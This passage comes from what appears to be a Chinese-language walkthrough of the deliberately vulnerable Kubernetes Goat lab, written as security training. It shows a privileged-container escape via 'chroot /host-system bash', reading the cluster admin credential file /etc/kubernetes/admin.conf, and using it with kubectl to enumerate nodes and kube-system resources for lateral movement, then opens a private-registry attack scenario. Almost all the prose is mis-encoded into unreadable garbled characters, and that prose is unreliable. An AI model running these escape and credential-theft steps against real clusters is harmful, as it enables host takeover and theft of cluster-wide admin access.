Securebits: 00/0x0/1'b0 <span class="token punctuation">(</span>no-new-privs<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
 secure-noroot: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
 secure-no-suid-fixup: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
 secure-keep-caps: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
 secure-no-ambient-raise: no <span class="token punctuation">(</span>unlocked<span class="token punctuation">)</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
<span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
<span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
Guessed mode: HYBRID <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
root@system-monitor-deployment-d4cbb9957-q4hlf:/<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.00.10.png" style="zoom:50%;">

<p>å¯ä»¥ç¡®å®šè¯¥å®¹å™¨å…·æœ‰ä¸»æœºç³»ç»Ÿçš„å…¨éƒ¨ç‰¹æƒï¼Œå¹¶å…è®¸ç‰¹æƒå‡çº§ï¼Œä»¥åŠ/host-systemè¢«æŒ‚è½½ã€‚</p>
<ul>
<li>è·å–å®¿ä¸»æœºç³»ç»Ÿè®¿é—®æƒé™</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.01.25.png" style="zoom:40%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /host-system <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.18.39.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.26.16.png" style="zoom:50%;">

<p>ã€æ‰§è¡Œå¤±è´¥ã€‘</p>
<ul>
<li>ç†æƒ³ç»“æœ</li>
</ul>
<blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">crictl pods
ctr <span class="token parameter variable">-n</span> k8s.io containers list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.23.52.png" style="zoom:50%;">
</blockquote>
<ul>
<li>k8sèŠ‚ç‚¹é…ç½®æ–‡ä»¶</li>
</ul>
<p>å¯ä»¥åœ¨é»˜è®¤è·¯å¾„ä¸­æ‰¾åˆ°KubernetesèŠ‚ç‚¹é…ç½®ï¼ŒèŠ‚ç‚¹çº§kubeletä½¿ç”¨è¯¥è·¯å¾„ä¸Kubernetes API Serveré€šä¿¡ã€‚å¦‚æœå¯ä»¥ä½¿ç”¨æ­¤é…ç½®ï¼Œå°†è·å¾—ä¸KubernetesèŠ‚ç‚¹ç›¸åŒçš„ç‰¹æƒã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/kubernetes/admin.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.28.52.png" style="zoom:50%;">

<ul>
<li>èŠ‚ç‚¹æ§åˆ¶æƒ</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨å¯ç”¨çš„kubectlå‘½ä»¤è¡Œå·¥å…·å’Œè·å¾—çš„é…ç½®æ¥æ¢ç´¢å…¶ä»–èµ„æºã€‚è¿˜å¯ä»¥é€šè¿‡kubectlæˆ–æ ¹æ®éœ€è¦ä¸‹è½½å®ƒä»¬æ¥åˆ©ç”¨è®¸å¤šå…¶ä»–æ½œåœ¨çš„åŠŸèƒ½ã€‚</p>
<p>è·å¾—äº†èŠ‚ç‚¹çš„æ§åˆ¶æƒä¹‹åå¯ä»¥å¼€å§‹è¿›è¡Œæ¨ªå‘ç§»åŠ¨å’Œåæ¸—é€ã€‚</p>
<p>è·å–èŠ‚ç‚¹ä¿¡æ¯ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl <span class="token parameter variable">--kubeconfig</span> /etc/kubernetes/admin.conf get nodes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.35.10.png" style="zoom:50%;">

<p>å¯ä»¥çœ‹åˆ°å®ƒè¿”å›äº†å¯ç”¨çš„é›†ç¾¤èŠ‚ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬æ‹¥æœ‰ä½¿ç”¨è·å¾—çš„é…ç½®æŸ¥è¯¢Kubernetes APIæœåŠ¡å™¨çš„ç‰¹æƒ/æƒé™ã€‚</p>
<p>è·å–èŠ‚ç‚¹èµ„æºï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl <span class="token parameter variable">--kubeconfig</span> /etc/kubernetes/admin.conf get all <span class="token parameter variable">-n</span> kube-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.31.24.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-14%2016.32.52.png" style="zoom:50%;">

<h2 id="3-5-Attacking-private-registry"><a href="#3-5-Attacking-private-registry" class="headerlink" title="3.5 Attacking private registry"></a>3.5 Attacking private registry</h2><p>æ”»å‡»Kubernetesé›†ç¾¤ä¸­çš„ç§æœ‰å®¹å™¨é•œåƒä»“åº“ã€‚</p>
<h3 id="3-5-1-åœºæ™¯ä»‹ç»"><a href="#3-5-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.5.1 åœºæ™¯ä»‹ç»"></a>3.5.1 åœºæ™¯ä»‹ç»</h3><p>è¿™ä¸€åœºæ™¯ä¸»è¦æ¢è®¨Dockerå®¹å™¨ç§æœ‰ä»“åº“çš„å¸¸è§é…ç½®é”™è¯¯ï¼Œä»¥åŠå¦‚ä½•è·å–å¹¶è®¿é—®å…¶é•œåƒåŠå†…éƒ¨å†…å®¹ã€‚</p>
<p>å®¹å™¨æŠ€æœ¯æ—©æœŸæ›¾å‘ç”Ÿè¿‡ä¸€èµ·å…¸å‹æ”»å‡»äº‹ä»¶ï¼šVineï¼ˆåè¢«Twitteræ”¶è´­ï¼‰å› è¿™ç±»ç®€å•é…ç½®æ¼æ´é­å…¥ä¾µï¼Œå¯¼è‡´æ•´ä¸ªäº§å“æºä»£ç æ³„éœ²ã€‚</p>
<p>å®¹å™¨ä»“åº“æ˜¯å­˜æ”¾æ‰€æœ‰å®¹å™¨é•œåƒçš„åœ°æ–¹ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ¯ä¸ªç»„ç»‡éƒ½æ‹¥æœ‰è‡ªå·±çš„ç§æœ‰ä»“åº“ã€‚ä½†æœ‰æ—¶ä»“åº“ä¼šè¢«é”™è¯¯é…ç½®ä¸ºå…¬å¼€çŠ¶æ€ã€‚å¦ä¸€æ–¹é¢ï¼Œå¼€å‘è€…å¾€å¾€é»˜è®¤å†…éƒ¨ç§æœ‰ä»“åº“ä»…ä¾›å†…éƒ¨ä½¿ç”¨ï¼Œä»è€Œå°†æ•æ„Ÿä¿¡æ¯ç›´æ¥å­˜å‚¨åœ¨å®¹å™¨é•œåƒä¸­ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2011.12.22.png" style="zoom:40%;">

<p>å®è·µç›®çš„ï¼š</p>
<ol>
<li>å¦‚ä½•ä¸Dockerå®¹å™¨ä»“åº“APIäº¤äº’ã€‚</li>
<li>èƒ½å¤Ÿæ£€æŸ¥å®¹å™¨æ³¨å†ŒAPIã€å®¹å™¨é•œåƒåŠæ¸…å•ã€‚</li>
<li>ç†è§£å®¹å™¨å…ƒæ•°æ®çš„å­˜å‚¨æ–¹å¼åŠå…¶ä¸é•œåƒå±‚çš„äº¤äº’æœºåˆ¶ã€‚</li>
</ol>
<h3 id="3-5-2-åœºæ™¯è®¿é—®"><a href="#3-5-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.5.2 åœºæ™¯è®¿é—®"></a>3.5.2 åœºæ™¯è®¿é—®</h3><p><code>http://192.168.52.13:1235/</code></p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2011.18.42.png" style="zoom:50%;">

<ul>
<li>è·å–ç§æœ‰ä»“åº“é•œåƒä¸­çš„k8s-goat-FLAGå€¼ã€‚</li>
</ul>
<h3 id="3-5-3-å®è·µ"><a href="#3-5-3-å®è·µ" class="headerlink" title="3.5.3 å®è·µ"></a>3.5.3 å®è·µ</h3><blockquote>
<p>ç”±äºè¿™æ˜¯ä¸€ä¸ªæœ‰æ„è®¾è®¡çš„æ¼æ´ç¯å¢ƒï¼Œæ‰€ä»¥ç›´æ¥æä¾›äº†è®¿é—®ç«¯ç‚¹ã€‚</p>
<p>åœ¨ç°å®åœºæ™¯ä¸­ï¼Œéœ€è¦å¼€å±•ä¿¡æ¯ä¾¦å¯Ÿå·¥ä½œï¼Œç”šè‡³å¯èƒ½éœ€è¦é€šè¿‡ç»„åˆåˆ©ç”¨å…¶ä»–æ¼æ´é“¾æ¥æ”»å‡»å·²è®¤è¯çš„é•œåƒä»“åº“ã€‚</p>
</blockquote>
<p>æ ¹æ®åœºæ™¯å’Œä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šè¿™å¯èƒ½æ˜¯Dockerå®¹å™¨ç§æœ‰ä»“åº“ã€‚åœ¨æŸ¥é˜…äº†ä¸€äº›æ–‡æ¡£å¹¶é€šè¿‡è°·æ­Œæœç´¢åï¼Œä»¥ä¸‹æ˜¯ç”¨äºä¸å®¹å™¨ä»“åº“é€šä¿¡çš„ç®€å•APIç«¯ç‚¹æŸ¥è¯¢ã€‚</p>
